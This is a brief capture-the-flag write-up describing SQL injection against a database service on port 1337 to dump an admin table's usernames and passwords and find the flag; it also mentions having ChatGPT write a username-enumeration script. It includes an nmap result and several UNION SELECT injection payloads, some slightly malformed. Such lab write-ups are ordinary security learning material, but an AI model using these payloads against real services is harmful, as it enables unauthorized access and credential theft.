The room says there is a database application running on port `1337` and gives us a username of `smokey` 
Started with a nmap scan
```
22 OpenSSH 8.2p1
1337 
```
When we connect to the service using ncat and give it are username it gives us a password but we need to find  a username of admin so I had ChatGPT make me a script to check for valid usernames this seems to not be the best way so I switched to trying sqli in injection with this injection we can dump the `admintable` 
`smokey' Union Select name FROM sqlite_master WHERE type='table`
now we have the table time to get the username 
`smokey' Union Select username FROM admintable WHERE username '%`
and we got `.........` now for the password 
`smokey' Union Select password FROM admintable WHERE username = ..................`
now we have the password `...........` but we can ssh in so I looked for anymore users in the database and found 2 entries and it was the flag 
`smokey' Union Select password FROM admintable WHERE username != '..................` 